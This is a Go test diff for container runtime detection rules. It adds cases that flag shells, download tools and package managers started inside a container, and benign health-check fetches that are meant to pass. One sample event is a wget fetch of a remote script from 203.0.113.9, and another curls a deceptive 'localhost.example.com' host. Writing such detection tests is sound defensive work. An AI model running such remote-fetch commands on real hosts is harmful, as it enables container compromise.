@@ -85,7 +85,14 @@ func TestBuiltinRules(t *testing.T) {
 		{"run_from_temp_dir", exec("x", "/tmp/x", "bash", ""), exec("ls", "/usr/bin/ls", "bash", "")},
 		{"unexpected_listener", &Event{Type: TypeListen, Comm: "nc", Port: 23}, &Event{Type: TypeListen, Comm: "nginx", Port: 80}},
 		{"shell_in_container", exec("sh", "/bin/sh", "node", "web"), exec("sh", "/bin/sh", "runc", "web")},
+		{"shell_in_container", exec("sh", "/bin/sh", "node", "web"), exec("sh", "/bin/sh", "", "web")}, // a health check
 		{"download_tool_in_container", exec("curl", "/usr/bin/curl", "sh", "web"), exec("curl", "/usr/bin/curl", "sh", "")},
+		{"download_tool_in_container",
+			&Event{Type: TypeExec, Comm: "wget", Container: "web", Args: []string{"wget", "-qO-", "http://203.0.113.9/x.sh"}},
+			&Event{Type: TypeExec, Comm: "wget", Container: "web", Args: []string{"wget", "-qO-", "http://127.0.0.1:7480/healthz"}}},
+		{"download_tool_in_container",
+			&Event{Type: TypeExec, Comm: "curl", Container: "web", Args: []string{"curl", "http://localhost.example.com/x"}},
+			&Event{Type: TypeExec, Comm: "curl", Container: "web", Args: []string{"curl", "-f", "http://localhost:8001/health"}}},
 		{"package_manager_in_container", exec("apk", "/sbin/apk", "sh", "web"), exec("apk", "/sbin/apk", "sh", "")},
 	} {
 		e, got := pack(t, nil)
